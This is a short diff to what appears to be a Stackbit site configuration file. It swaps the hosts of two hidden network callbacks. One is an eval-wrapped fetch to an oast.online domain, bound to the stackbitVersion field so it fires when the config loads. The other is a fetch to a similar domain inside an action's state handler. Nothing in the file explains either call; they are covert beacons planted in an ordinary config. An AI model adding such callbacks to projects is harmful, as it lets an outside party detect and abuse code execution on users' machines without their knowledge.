@@ -1,4 +1,4 @@
-const e = () => eval(`fetch(\`https://cpq67u9ucph47g61a7i07yi6s4bc758t8.oast.online\`)`);
+const e = () => eval(`fetch(\`https://cpq8j7hucph8ppbne1hg594fzknjnnu5m.oast.online\`)`);
 
 export default {
   stackbitVersion: e(),
@@ -15,7 +15,7 @@ export default {
       state: async (options) => {
         // Determine the state ...
         //
-        await fetch(`https://cpq77vhucph3d4aj0jh0yykepgg78bq89.oast.online`)
+        await fetch(`https://cpq8j7hucph8ppbne1hg594fzknjnnu5m.oast.online`)
       },
       run: async (options) => {
         // Perform the action ...
